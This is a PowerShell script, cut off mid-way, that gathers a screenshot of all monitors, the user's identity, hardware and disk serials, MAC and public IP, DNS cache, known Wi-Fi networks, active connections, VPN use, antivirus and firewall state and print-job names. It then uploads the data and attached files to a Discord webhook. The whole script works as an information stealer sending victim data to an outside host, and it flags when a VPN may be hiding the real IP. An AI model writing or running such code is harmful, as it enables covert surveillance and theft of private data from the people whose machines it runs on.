$ErrorActionPreference = "Continue"

$root = Split-Path -Parent $MyInvocation.MyCommand.Path
$out = Join-Path $root "info.txt"
$jsonOut = Join-Path $root "info.json"
$zipOut = Join-Path $root "info_upload.zip"
$done = Join-Path $root "done.txt"
$webhookFile = Join-Path $root "discord_webhook.txt"

$screenshotOut = Join-Path $root "screenshot.png"

if (Test-Path $out)           { Remove-Item $out           -Force }
if (Test-Path $jsonOut)       { Remove-Item $jsonOut       -Force }
if (Test-Path $zipOut)        { Remove-Item $zipOut        -Force }
if (Test-Path $done)          { Remove-Item $done          -Force }
if (Test-Path $screenshotOut) { Remove-Item $screenshotOut -Force }

$jsonData = [ordered]@{}

function Add-Section {
    param([string]$Title)
    Add-Content -Path $out -Value ""
    Add-Content -Path $out -Value ("=" * 90)
    Add-Content -Path $out -Value $Title
    Add-Content -Path $out -Value ("=" * 90)
}

function Add-Line {
    param([string]$Name, [object]$Value)
    if ($null -eq $Value) { return }
    $text = $Value.ToString().Trim()
    if ([string]::IsNullOrWhiteSpace($text)) { return }
    $safe = $text -replace "\r|\n", " "
    Add-Content -Path $out -Value ("{0}: {1}" -f $Name, $safe)
}

function Add-Table {
    param([string]$Title, [object]$Data)
    Add-Content -Path $out -Value ""
    Add-Content -Path $out -Value ("-- " + $Title + " --")
    if ($null -eq $Data) {
        Add-Content -Path $out -Value "(no data)"
        return
    }
    $lines = $Data | Out-String -Width 260
    Add-Content -Path $out -Value $lines.TrimEnd()
}

function Set-JsonSection {
    param([string]$Name, [object]$Value)
    $jsonData[$Name] = $Value
}

function Invoke-SafeBlock {
    param([scriptblock]$Script)
    try {
        & $Script
    } catch {
        Add-Content -Path $out -Value ("Error: " + $_.Exception.Message)
    }
}

function Resolve-DiscordWebhook {
    $fromEnv = $env:DISCORD_WEBHOOK_URL
    if (-not [string]::IsNullOrWhiteSpace($fromEnv)) {
        return $fromEnv.Trim()
    }

    if (Test-Path $webhookFile) {
        $line = (Get-Content -Path $webhookFile -ErrorAction SilentlyContinue | Select-Object -First 1)
        if (-not [string]::IsNullOrWhiteSpace($line)) {
            return $line.Trim()
        }
    }

    return $null
}

function Build-DiscordPayload {
    param([string]$FileName)

    # Discord limits: 25 fields per embed, 10 embeds per message, 6000 total chars.
    # We use 3 embeds in one message to stay safely under the field cap.

    # ── Embed 1: Identity, OS & Hardware (CPU / RAM / GPU) ───────────────────
    $e1 = [System.Collections.Generic.List[hashtable]]::new()

    $basic = $jsonData["Basic"]
    if ($basic) {
        $e1.Add(@{ name = "User";               value = "$($basic.CurrentUser)";       inline = $true })
        $e1.Add(@{ name = "Machine";            value = "$($basic.Machine)";           inline = $true })
        $e1.Add(@{ name = "Domain";             value = "$($basic.Domain)";            inline = $true })
        $e1.Add(@{ name = "PowerShell Version"; value = "$($basic.PowerShellVersion)"; inline = $true })
    }

    $osDevice = $jsonData["OSAndDevice"]
    if ($osDevice) {
        $e1.Add(@{ name = "OS";           value = "$($osDevice.OS)";           inline = $true })
        $e1.Add(@{ name = "Build";        value = "$($osDevice.Build)";        inline = $true })
        $e1.Add(@{ name = "Architecture"; value = "$($osDevice.Architecture)"; inline = $true })
        $model = ("{0} {1}" -f $osDevice.Manufacturer, $osDevice.Model).Trim()
        if ($model) { $e1.Add(@{ name = "Model"; value = $model; inline = $true }) }
        $e1.Add(@{ name = "Last Boot"; value = "$($osDevice.LastBoot)"; inline = $true })
        if ($osDevice.TimeZone)              { $e1.Add(@{ name = "Time Zone";    value = "$($osDevice.TimeZone)";    inline = $true }) }
        if ($null -ne $osDevice.SecureBoot)  { $e1.Add(@{ name = "Secure Boot"; value = "$($osDevice.SecureBoot)"; inline = $true }) }
        if ($osDevice.BIOSVersion)           { $e1.Add(@{ name = "BIOS Version"; value = "$($osDevice.BIOSVersion)"; inline = $true }) }
        if ($osDevice.BIOSSerial)            { $e1.Add(@{ name = "BIOS Serial";  value = "$($osDevice.BIOSSerial)";  inline = $true }) }
        if ($osDevice.TotalPhysicalMemoryBytes) {
            $ramGb = [math]::Round($osDevice.TotalPhysicalMemoryBytes / 1GB, 1)
            $e1.Add(@{ name = "Total RAM"; value = "${ramGb} GB"; inline = $true })
        }
    }

    $cpuList = $jsonData["CPU"]
    if ($cpuList) {
        $cpu0 = if ($cpuList -is [array]) { $cpuList[0] } else { $cpuList }
        if ($cpu0.Name)          { $e1.Add(@{ name = "CPU";             value = "$($cpu0.Name)"; inline = $true }) }
        if ($cpu0.NumberOfCores) { $e1.Add(@{ name = "Cores / Threads"; value = "$($cpu0.NumberOfCores) / $($cpu0.NumberOfLogicalProcessors)"; inline = $true }) }
        if ($cpu0.MaxClockSpeed) { $e1.Add(@{ name = "Max Clock";       value = "$([math]::Round($cpu0.MaxClockSpeed / 1000, 2)) GHz"; inline = $true }) }
    }

    $ramList = $jsonData["RAM"]
    if ($ramList) {
        $ramArr     = if ($ramList -is [array]) { $ramList } else { @($ramList) }
        $stickCount = $ramArr.Count
        $firstSpeed = $ramArr[0].ConfiguredClockSpeed
        $stickSizes = ($ramArr | ForEach-Object { "$([math]::Round($_.Capacity / 1GB, 0))GB" }) -join " + "
        if ($stickCount -and $firstSpeed) {
            $e1.Add(@{ name = "RAM Sticks"; value = "${stickCount}x @ ${firstSpeed} MHz ($stickSizes)"; inline = $true })
        }
        $ramMfrs = ($ramArr | Where-Object { $_.Manufacturer } | Select-Object -ExpandProperty Manufacturer -Unique) -join ", "
        if ($ramMfrs) { $e1.Add(@{ name = "RAM Manufacturer"; value = $ramMfrs; inline = $true }) }
    }

    $gpuList = $jsonData["GPU"]
    if ($gpuList) {
        $gpuArr = if ($gpuList -is [array]) { $gpuList } else { @($gpuList) }
        foreach ($gpu in $gpuArr) {
            if ($gpu.Name) {
                $vramStr = if ($gpu.AdapterRAM -and $gpu.AdapterRAM -gt 0) { " ($([math]::Round($gpu.AdapterRAM / 1GB, 1)) GB)" } else { "" }
                $e1.Add(@{ name = "GPU"; value = "$($gpu.Name)$vramStr"; inline = $true })
            }
            if ($gpu.CurrentHorizontalResolution -and $gpu.CurrentVerticalResolution) {
                $e1.Add(@{ name = "Resolution"; value = "$($gpu.CurrentHorizontalResolution) x $($gpu.CurrentVerticalResolution)"; inline = $true })
            }
        }
    }

    # ── Embed 2: Storage, Network & Connections ───────────────────────────────
    $e2 = [System.Collections.Generic.List[hashtable]]::new()

    $storage = $jsonData["Storage"]
    if ($storage -and $storage.PhysicalDisks) {
        $disks = if ($storage.PhysicalDisks -is [array]) { $storage.PhysicalDisks } else { @($storage.PhysicalDisks) }
        $e2.Add(@{ name = "Disk Count"; value = "$($disks.Count)"; inline = $true })
        foreach ($d in $disks) {
            if ($d.Model) {
                $sizeGb = if ($d.Size) { "$([math]::Round($d.Size / 1GB, 0)) GB" } else { "?" }
                $iface  = if ($d.InterfaceType) { " [$($d.InterfaceType)]" } else { "" }
                $e2.Add(@{ name = "Disk"; value = "$($d.Model) — $sizeGb$iface"; inline = $true })
            }
        }
        if ($storage.LogicalDisks) {
            $ldArr     = if ($storage.LogicalDisks -is [array]) { $storage.LogicalDisks } else { @($storage.LogicalDisks) }
            $ldSummary = ($ldArr | Where-Object { $_.Size -and $_.Size -gt 0 } | ForEach-Object {
                "$($_.DeviceID) $([math]::Round($_.FreeSpace / 1GB, 0))/$([math]::Round($_.Size / 1GB, 0)) GB free"
            }) -join "  |  "
            if ($ldSummary) { $e2.Add(@{ name = "Logical Drives"; value = $ldSummary; inline = $false }) }
        }
    }

    $hwExtras = $jsonData["HardwareExtras"]
    if ($hwExtras -and $hwExtras.Monitors) {
        $monArr    = if ($hwExtras.Monitors -is [array]) { $hwExtras.Monitors } else { @($hwExtras.Monitors) }
        $monSummary = ($monArr | Where-Object { $_.Name } | ForEach-Object {
            $res = if ($_.ScreenWidth -and $_.ScreenHeight) { " ($($_.ScreenWidth)x$($_.ScreenHeight))" } else { "" }
            "$($_.Name)$res"
        }) -join "  |  "
        if ($monSummary) { $e2.Add(@{ name = "Monitor(s)"; value = $monSummary; inline = $false }) }
    }

    $network = $jsonData["Network"]
    if ($network) {
        if ($network.IPv4) {
            $ipArr   = if ($network.IPv4 -is [array]) { $network.IPv4 } else { @($network.IPv4) }
            $localIp = $ipArr | Where-Object { $_.IPAddress -and -not $_.IPAddress.StartsWith("127.") } | Select-Object -First 1
            if ($localIp) { $e2.Add(@{ name = "Local IPv4"; value = "$($localIp.IPAddress) / $($localIp.PrefixLength)"; inline = $true }) }
        }
        if ($network.Adapters) {
            $adpArr    = if ($network.Adapters -is [array]) { $network.Adapters } else { @($network.Adapters) }
            $activeAdp = $adpArr | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1
            if ($activeAdp) {
                $e2.Add(@{ name = "Active Adapter"; value = "$($activeAdp.InterfaceDescription)"; inline = $true })
                if ($activeAdp.MacAddress) { $e2.Add(@{ name = "MAC Address"; value = "$($activeAdp.MacAddress)"; inline = $true }) }
                if ($activeAdp.LinkSpeed)  { $e2.Add(@{ name = "Link Speed";  value = "$($activeAdp.LinkSpeed)";  inline = $true }) }
            }
        }
        if ($network.DNS) {
            $dnsArr    = if ($network.DNS -is [array]) { $network.DNS } else { @($network.DNS) }
            $dnsServers = ($dnsArr | Where-Object { $_.ServerAddresses } | ForEach-Object { $_.ServerAddresses } | Select-Object -Unique -First 6) -join ", "
            if ($dnsServers) { $e2.Add(@{ name = "DNS Servers"; value = $dnsServers; inline = $false }) }
        }
    }

    $connHistory = $jsonData["ConnectionHistory"]
    if ($connHistory) {
        if ($connHistory.TCPConnections) {
            $tcpArr   = if ($connHistory.TCPConnections -is [array]) { $connHistory.TCPConnections } else { @($connHistory.TCPConnections) }
            $estCount = ($tcpArr | Where-Object { $_.State -eq "Established" }).Count
            $lisCount = ($tcpArr | Where-Object { $_.State -eq "Listen" }).Count
            $e2.Add(@{ name = "TCP Connections"; value = "$($tcpArr.Count) total  |  Established: $estCount  |  Listen: $lisCount"; inline = $false })
        }
        if ($connHistory.WiFiProfiles) {
            $wpArr  = if ($connHistory.WiFiProfiles -is [array]) { $connHistory.WiFiProfiles } else { @($connHistory.WiFiProfiles) }
            $wpList = ($wpArr | Select-Object -First 8) -join ", "
            if ($wpList) { $e2.Add(@{ name = "Known Wi-Fi Networks ($($wpArr.Count))"; value = $wpList; inline = $false }) }
        }
        if ($connHistory.WLANEvents) {
            $weArr    = if ($connHistory.WLANEvents -is [array]) { $connHistory.WLANEvents } else { @($connHistory.WLANEvents) }
            $lastConn = $weArr | Where-Object { $_.Id -eq 8001 } | Select-Object -First 1
            if ($lastConn) { $e2.Add(@{ name = "Last Wi-Fi Connect"; value = "$($lastConn.TimeCreated)"; inline = $true }) }
        }
    }

    $vpn = $jsonData["VPN"]
    $vpnActive = $vpn -and $vpn.Status -eq "Active"
    if ($vpn) {
        $vpnStatusVal = $vpn.Status
        if ($vpn.ActiveAdapters) {
            $vpnActArr = if ($vpn.ActiveAdapters -is [array]) { $vpn.ActiveAdapters } else { @($vpn.ActiveAdapters) }
            $vpnNames  = ($vpnActArr | Where-Object { $_.InterfaceDescription } | ForEach-Object { $_.InterfaceDescription }) -join ", "
            if ($vpnNames) { $vpnStatusVal += " — $vpnNames" }
        } elseif ($vpn.Processes) {
            $vpnProcArr   = if ($vpn.Processes -is [array]) { $vpn.Processes } else { @($vpn.Processes) }
            $vpnProcNames = ($vpnProcArr | ForEach-Object { $_.Name } | Select-Object -Unique) -join ", "
            if ($vpnProcNames) { $vpnStatusVal += " (process: $vpnProcNames)" }
        }
        $e2.Add(@{ name = "VPN"; value = $vpnStatusVal; inline = $false })
        if ($vpnActive -and $vpn.SampleRoutes) {
            $rtArr    = if ($vpn.SampleRoutes -is [array]) { $vpn.SampleRoutes } else { @($vpn.SampleRoutes) }
            $rtSample = ($rtArr | Select-Object -First 3 | ForEach-Object { "$($_.DestinationPrefix) via $($_.NextHop)" }) -join "  |  "
            if ($rtSample) { $e2.Add(@{ name = "VPN Routes (sample)"; value = $rtSample; inline = $false }) }
        }
    }

    $internet = $jsonData["Internet"]
    if ($internet -and $internet.PublicIP -and $internet.PublicIP -ne "Unavailable") {
        $ipNote = if ($vpnActive) { " ⚠ VPN may mask real IP" } else { "" }
        $e2.Add(@{ name = "Public IP"; value = "$($internet.PublicIP)$ipNote"; inline = $true })
    }

    # ── Embed 3: Security & Summary ───────────────────────────────────────────
    $e3 = [System.Collections.Generic.List[hashtable]]::new()

    $security = $jsonData["Security"]
    if ($security) {
        if ($security.Defender) {
            $av   = if ($security.Defender.AntivirusEnabled)          { "Yes" } else { "No" }
            $rtp  = if ($security.Defender.RealTimeProtectionEnabled) { "Yes" } else { "No" }
            $tamp = if ($security.Defender.IsTamperProtected)         { "Yes" } else { "No" }
            $e3.Add(@{ name = "Antivirus";           value = $av;   inline = $true })
            $e3.Add(@{ name = "Real-Time Protect";   value = $rtp;  inline = $true })
            $e3.Add(@{ name = "Tamper Protection";   value = $tamp; inline = $true })
        }
        if ($security.FirewallProfiles) {
            $fwArr     = if ($security.FirewallProfiles -is [array]) { $security.FirewallProfiles } else { @($security.FirewallProfiles) }
            $fwSummary = ($fwArr | ForEach-Object { "$($_.Name): $(if ($_.Enabled) { 'On' } else { 'Off' })" }) -join "  |  "
            $e3.Add(@{ name = "Firewall"; value = $fwSummary; inline = $false })
        }
        if ($security.BitLocker) {
            $blArr     = if ($security.BitLocker -is [array]) { $security.BitLocker } else { @($security.BitLocker) }
            $blSummary = ($blArr | ForEach-Object { "$($_.MountPoint): $($_.ProtectionStatus)" }) -join "  |  "
            $e3.Add(@{ name = "BitLocker"; value = $blSummary; inline = $false })
        }
        if ($security.TPM -and $null -ne $security.TPM.TpmPresent) {
            $e3.Add(@{ name = "TPM"; value = "Present: $($security.TPM.TpmPresent)  Ready: $($security.TPM.TpmReady)"; inline = $true })
        }
    }

    $localAccounts = $jsonData["LocalAccounts"]
    if ($localAccounts -and $localAccounts.Users) {
        $uArr    = if ($localAccounts.Users -is [array]) { $localAccounts.Users } else { @($localAccounts.Users) }
        $enabled = ($uArr | Where-Object { $_.Enabled }).Count
        $e3.Add(@{ name = "Local Users"; value = "$($uArr.Count) total, $enabled enabled"; inline = $true })
    }

    $software = $jsonData["Software"]
    if ($software) {
        $e3.Add(@{ name = "Installed Apps"; value = "$($software.InstalledAppCount)"; inline = $true })
        if ($software.HotFixes) {
            $hfArr = if ($software.HotFixes -is [array]) { $software.HotFixes } else { @($software.HotFixes) }
            $e3.Add(@{ name = "HotFixes Installed"; value = "$($hfArr.Count)"; inline = $true })
        }
    }

    $startupSched = $jsonData["StartupAndScheduled"]
    if ($startupSched -and $startupSched.Startup) {
        $suArr = if ($startupSched.Startup -is [array]) { $startupSched.Startup } else { @($startupSched.Startup) }
        $e3.Add(@{ name = "Startup Items"; value = "$($suArr.Count)"; inline = $true })
    }

    if ($hwExtras) {
        if ($hwExtras.USB) {
            $usbArr = if ($hwExtras.USB -is [array]) { $hwExtras.USB } else { @($hwExtras.USB) }
            $e3.Add(@{ name = "USB Devices"; value = "$($usbArr.Count)"; inline = $true })
        }
        if ($hwExtras.Printers) {
            $prArr = if ($hwExtras.Printers -is [array]) { $hwExtras.Printers } else { @($hwExtras.Printers) }
            $e3.Add(@{ name = "Printers"; value = "$($prArr.Count)"; inline = $true })
        }
        $pjArr = if ($hwExtras.PrintJobs) { if ($hwExtras.PrintJobs -is [array]) { $hwExtras.PrintJobs } else { @($hwExtras.PrintJobs) } } else { @() }
        if ($pjArr.Count -gt 0) {
            $pjSummary = ($pjArr | Select-Object -First 5 | ForEach-Object {
                "$($_.Printer): $($_.DocumentName) [$($_.JobStatus)]"
            }) -join "  |  "
            $e3.Add(@{ name = "Print Queue ($($pjArr.Count) job$(if ($pjArr.Count -ne 1) { 's' }))"; value = $pjSummary; inline = $false })
        } else {
            $e3.Add(@{ name = "Print Queue"; value = "Empty"; inline = $true })
        }
        if ($hwExtras.Shares) {
            $shArr   = if ($hwExtras.Shares -is [array]) { $hwExtras.Shares } else { @($hwExtras.Shares) }
            $shNames = ($shArr | ForEach-Object { $_.Name }) -join ", "
            if ($shNames) { $e3.Add(@{ name = "SMB Shares"; value = $shNames; inline = $true }) }
        }
    }

    $eventSummary = $jsonData["EventSummary"]
    if ($eventSummary) {
        $sysErrCount = 0; $appErrCount = 0
        if ($eventSummary.System)      { $sysErrCount = if ($eventSummary.System -is [array])      { $eventSummary.System.Count }      else { 1 } }
        if ($eventSummary.Application) { $appErrCount = if ($eventSummary.Application -is [array]) { $eventSummary.Application.Count } else { 1 } }
        $e3.Add(@{ name = "Events (7d)"; value = "System errors: $sysErrCount  |  App errors: $appErrCount"; inline = $false })
    }

    $embed1 = @{
        title     = "System Report: $env:COMPUTERNAME"
        color     = 3447003
        fields    = $e1.ToArray()
        timestamp = (Get-Date -Format o)
    }
    if (Test-Path $screenshotOut) {
        $embed1["image"] = @{ url = "attachment://screenshot.png" }
    }

    return @{
        embeds = @(
            $embed1,
            @{
                title  = "Storage, Network & Connections"
                color  = 3066993
                fields = $e2.ToArray()
            },
            @{
                title  = "Security & Summary"
                color  = 15158332
                fields = $e3.ToArray()
                footer = @{ text = "Full data attached: $FileName" }
            }
        )
    }
}

function Send-DiscordWebhookFiles {
    param(
        [string]$WebhookUrl,
        [object]$Payload,
        [string[]]$FilePaths
    )

    Add-Type -AssemblyName System.Net.Http

    $client = $null
    $multipart = $null

    try {
        $client = New-Object System.Net.Http.HttpClient
        $multipart = New-Object System.Net.Http.MultipartFormDataContent
        $payloadJson = $Payload | ConvertTo-Json -Depth 5 -Compress
        $payloadContent = New-Object System.Net.Http.StringContent($payloadJson, [System.Text.Encoding]::UTF8, "application/json")
        $multipart.Add($payloadContent, "payload_json")

        $index = 0
        foreach ($file in $FilePaths) {
            if (-not (Test-Path $file)) { continue }
            $bytes = [System.IO.File]::ReadAllBytes($file)
            $fileContent = New-Object System.Net.Http.ByteArrayContent -ArgumentList (,$bytes)
            $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
            $multipart.Add($fileContent, ("files[{0}]" -f $index), [System.IO.Path]::GetFileName($file))
            $index++
        }

        $response = $client.PostAsync($WebhookUrl, $multipart).Result
        if (-not $response.IsSuccessStatusCode) {
            $body = $response.Content.ReadAsStringAsync().Result
            throw "Discord upload failed: $($response.StatusCode) $body"
        }
    } finally {
        if ($multipart) { $multipart.Dispose() }
        if ($client) { $client.Dispose() }
    }
}

Add-Section "BASIC"
$basic = [ordered]@{
    Timestamp = (Get-Date -Format o)
    CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    Machine = $env:COMPUTERNAME
    Domain = $env:USERDOMAIN
    PowerShellVersion = $PSVersionTable.PSVersion.ToString()
}
foreach ($k in $basic.Keys) { Add-Line $k $basic[$k] }
Set-JsonSection "Basic" $basic

Invoke-SafeBlock {
    Add-Section "SCREENSHOT"
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $left   = ($screens | ForEach-Object { $_.Bounds.Left   } | Measure-Object -Minimum).Minimum
    $top    = ($screens | ForEach-Object { $_.Bounds.Top    } | Measure-Object -Minimum).Minimum
    $right  = ($screens | ForEach-Object { $_.Bounds.Right  } | Measure-Object -Maximum).Maximum
    $bottom = ($screens | ForEach-Object { $_.Bounds.Bottom } | Measure-Object -Maximum).Maximum
    $width  = $right  - $left
    $height = $bottom - $top

    $bitmap   = New-Object System.Drawing.Bitmap($width, $height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($left, $top, 0, 0, (New-Object System.Drawing.Size($width, $height)))
    $bitmap.Save($screenshotOut, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()

    $screenInfo = $screens | ForEach-Object {
        [ordered]@{
            DeviceName = $_.DeviceName
            Primary    = $_.Primary
            Bounds     = "$($_.Bounds.Width)x$($_.Bounds.Height) at ($($_.Bounds.X),$($_.Bounds.Y))"
        }
    }

    Add-Line "ScreenCount"  $screens.Count
    Add-Line "TotalCapture" "${width}x${height}"
    Add-Line "SavedTo"      $screenshotOut
    Set-JsonSection "Screenshot" ([ordered]@{
        ScreenCount  = $screens.Count
        TotalCapture = "${width}x${height}"
        Screens      = $screenInfo
        SavedTo      = $screenshotOut
    })
}

Invoke-SafeBlock {
    $os = Get-CimInstance Win32_OperatingSystem
    $cs = Get-CimInstance Win32_ComputerSystem
    $bios = Get-CimInstance Win32_BIOS
    $board = Get-CimInstance Win32_BaseBoard

    Add-Section "OS AND DEVICE"
    Add-Line "OS" $os.Caption
    Add-Line "Version" $os.Version
    Add-Line "Build" $os.BuildNumber
    Add-Line "Architecture" $os.OSArchitecture
    Add-Line "InstallDate" $os.InstallDate
    Add-Line "LastBoot" $os.LastBootUpTime
    Add-Line "Manufacturer" $cs.Manufacturer
    Add-Line "Model" $cs.Model
    Add-Line "SystemType" $cs.SystemType
    Add-Line "TotalPhysicalMemoryBytes" $cs.TotalPhysicalMemory
    Add-Line "BIOSVersion" (($bios.SMBIOSBIOSVersion -join ", "))
    Add-Line "BIOSSerial" $bios.SerialNumber
    Add-Line "BaseBoard" (("{0} {1}" -f $board.Manufacturer, $board.Product).Trim())

    $secureBoot = "Unknown"
    try { $secureBoot = (Confirm-SecureBootUEFI) } catch {}

    $osDevice = [ordered]@{
        OS = $os.Caption
        Version = $os.Version
        Build = $os.BuildNumber
        Architecture = $os.OSArchitecture
        InstallDate = $os.InstallDate
        LastBoot = $os.LastBootUpTime
        Manufacturer = $cs.Manufacturer
        Model = $cs.Model
        SystemType = $cs.SystemType
        TotalPhysicalMemoryBytes = $cs.TotalPhysicalMemory
        BIOSVersion = ($bios.SMBIOSBIOSVersion -join ", ")
        BIOSSerial = $bios.SerialNumber
        BaseBoardManufacturer = $board.Manufacturer
        BaseBoardProduct = $board.Product
        TimeZone = (Get-TimeZone).Id
        SecureBoot = $secureBoot
    }
    Set-JsonSection "OSAndDevice" $osDevice
}

Invoke-SafeBlock {
    Add-Section "CPU"
    $cpu = Get-CimInstance Win32_Processor |
        Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, CurrentClockSpeed, ProcessorId
    Add-Table "CPU List" $cpu
    Set-JsonSection "CPU" $cpu
}

Invoke-SafeBlock {
    Add-Section "RAM"
    $mem = Get-CimInstance Win32_PhysicalMemory |
        Select-Object BankLabel, Manufacturer, PartNumber, Speed, ConfiguredClockSpeed, Capacity, SerialNumber
    Add-Table "Memory Modules" $mem
    Set-JsonSection "RAM" $mem
}

Invoke-SafeBlock {
    Add-Section "GPU"
    $gpu = Get-CimInstance Win32_VideoController |
        Select-Object Name, AdapterRAM, DriverVersion, VideoProcessor, CurrentHorizontalResolution, CurrentVerticalResolution
    Add-Table "Video Controllers" $gpu
    Set-JsonSection "GPU" $gpu
}

Invoke-SafeBlock {
    Add-Section "STORAGE"
    $physical = Get-CimInstance Win32_DiskDrive | Select-Object Model, InterfaceType, MediaType, Size, SerialNumber
    $logical = Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, DriveType, FileSystem, Size, FreeSpace, VolumeName
    $parts = Get-CimInstance Win32_DiskPartition | Select-Object Name, Type, Size, Bootable, BootPartition
    Add-Table "Physical Disks" $physical
    Add-Table "Logical Disks" $logical
    Add-Table "Disk Partitions" $parts
    Set-JsonSection "Storage" ([ordered]@{ PhysicalDisks = $physical; LogicalDisks = $logical; Partitions = $parts })
}

Invoke-SafeBlock {
    Add-Section "NETWORK"
    $adapters = Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, LinkSpeed, MacAddress
    $ip4 = Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixLength, AddressState
    $ip6 = Get-NetIPAddress -AddressFamily IPv6 | Select-Object InterfaceAlias, IPAddress, PrefixLength, AddressState
    $dns = Get-DnsClientServerAddress | Select-Object InterfaceAlias, AddressFamily, ServerAddresses
    $routes = Get-NetRoute | Select-Object -First 100 DestinationPrefix, NextHop, RouteMetric, InterfaceAlias
    Add-Table "Adapters" $adapters
    Add-Table "IPv4 Addresses" $ip4
    Add-Table "IPv6 Addresses" $ip6
    Add-Table "DNS Client" $dns
    Add-Table "Routes (Top 100)" $routes
    Set-JsonSection "Network" ([ordered]@{ Adapters = $adapters; IPv4 = $ip4; IPv6 = $ip6; DNS = $dns; Routes = $routes })
}

Invoke-SafeBlock {
    Add-Section "CONNECTION HISTORY"

    # Active TCP connections (structured, better than raw netstat)
    $tcpConn = Get-NetTCPConnection -ErrorAction SilentlyContinue |
        Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
    Add-Table "TCP Connections" $tcpConn

    # Active UDP endpoints
    $udpConn = Get-NetUDPEndpoint -ErrorAction SilentlyContinue |
        Select-Object LocalAddress, LocalPort, OwningProcess
    Add-Table "UDP Endpoints" $udpConn

    # DNS client cache — shows recently resolved hostnames
    $dnsCache = Get-DnsClientCache -ErrorAction SilentlyContinue |
        Select-Object Entry, RecordName, RecordType, Status, DataLength, Data
    Add-Table "DNS Client Cache" $dnsCache

    # Wi-Fi profiles (names only, no passwords)
    $wifiProfiles = $null
    try {
        $wifiRaw = (netsh wlan show profiles) 2>$null
        $wifiProfiles = $wifiRaw | Select-String "All User Profile\s*:\s*(.+)" |
            ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }
        if ($wifiProfiles) {
            Add-Content -Path $out -Value ""
            Add-Content -Path $out -Value "-- Wi-Fi Profiles --"
            $wifiProfiles | ForEach-Object { Add-Content -Path $out -Value $_ }
        }
    } catch {}

    # Recent network-related events (connected/disconnected, DHCP, DNS)
    $netEvents = $null
    try {
        $netEvents = Get-WinEvent -FilterHashtable @{
            LogName   = "Microsoft-Windows-NetworkProfile/Operational"
            StartTime = (Get-Date).AddDays(-14)
        } -MaxEvents 60 -ErrorAction Stop |
            Select-Object TimeCreated, Id, LevelDisplayName, Message
        Add-Table "Network Profile Events (14d)" $netEvents
    } catch {}

    # WLAN connection events (Event ID 8001 = connected, 8003 = disconnected)
    $wlanEvents = $null
    try {
        $wlanEvents = Get-WinEvent -FilterHashtable @{
            LogName   = "Microsoft-Windows-WLAN-AutoConfig/Operational"
            Id        = @(8001, 8003)
            StartTime = (Get-Date).AddDays(-14)
        } -MaxEvents 60 -ErrorAction Stop |
            Select-Object TimeCreated, Id, Message
        Add-Table "WLAN Connect/Disconnect Events (14d)" $wlanEvents
    } catch {}

    Set-JsonSection "ConnectionHistory" ([ordered]@{
        TCPConnections  = $tcpConn
        UDPEndpoints    = $udpConn
        DNSCache        = $dnsCache
        WiFiProfiles    = $wifiProfiles
        NetworkEvents   = $netEvents
        WLANEvents      = $wlanEvents
    })
}

Invoke-SafeBlock {
    Add-Section "VPN"

    $vpnAdapterKeywords = @(
        "vpn", "tap-windows", "tap adapter", "tun", "wireguard", "nordvpn", "expressvpn",
        "protonvpn", "mullvad", "surfshark", "openvpn", "cisco anyconnect", "anyconnect",
        "pulse secure", "globalprotect", "pangp", "fortinet", "sonicwall", "tailscale",
        "l2tp", "pptp", "sstp", "ikev2", "ipsec tunnel"
    )
    $vpnProcessKeywords = @(
        "nordvpn", "expressvpn", "protonvpn", "mullvad", "surfshark", "openvpn", "wireguard",
        "tailscale", "vpnagent", "vpnui", "forticlient", "pangpa", "pangps", "dsaccessservice",
        "pulsesecure", "pulse", "vpnclient", "vpngui", "wg"
    )

    $allAdapters = Get-NetAdapter -ErrorAction SilentlyContinue
    $vpnAdapters = $allAdapters | Where-Object {
        $n = $_.Name.ToLower(); $d = $_.InterfaceDescription.ToLower()
        ($vpnAdapterKeywords | Where-Object { $n -like "*$_*" -or $d -like "*$_*" }).Count -gt 0
    } | Select-Object Name, InterfaceDescription, Status, MacAddress

    $vpnProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object {
        $p = $_.Name.ToLower()
        ($vpnProcessKeywords | Where-Object { $p -like "*$_*" }).Count -gt 0
    } | Select-Object Name, Id, CPU, WorkingSet

    # Any /32 host routes injected via a non-loopback, non-default gateway — common VPN tunnel pattern
    $vpnRoutes = Get-NetRoute -ErrorAction SilentlyContinue |
        Where-Object { $_.DestinationPrefix -match "/32$" -and $_.NextHop -notin @("0.0.0.0","") } |
        Select-Object -First 15 DestinationPrefix, NextHop, InterfaceAlias

    $activeVpnAdapters = @($vpnAdapters | Where-Object { $_.Status -eq "Up" })
    $vpnStatus = if ($activeVpnAdapters.Count -gt 0) {
        "Active"
    } elseif ($vpnAdapters) {
        "Adapter Present (Down)"
    } elseif ($vpnProcs) {
        "Client Running (no tunnel adapter)"
    } else {
        "Not Detected"
    }

    Add-Line "VPNStatus" $vpnStatus
    Add-Table "VPN Adapters" $vpnAdapters
    Add-Table "VPN Processes" $vpnProcs
    Add-Table "VPN-style Routes (sample)" $vpnRoutes

    Set-JsonSection "VPN" ([ordered]@{
        Status          = $vpnStatus
        Adapters        = $vpnAdapters
        ActiveAdapters  = $activeVpnAdapters
        Processes       = $vpnProcs
        SampleRoutes    = $vpnRoutes
    })
}

Invoke-SafeBlock {
    Add-Section "SECURITY"
    $def = Get-MpComputerStatus |
        Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled, IsTamperProtected, NISEnabled, IoavProtectionEnabled
    $fw = Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
    Add-Table "Windows Defender Computer Status" $def
    Add-Table "Firewall Profiles" $fw

    $bitlocker = $null
    try {
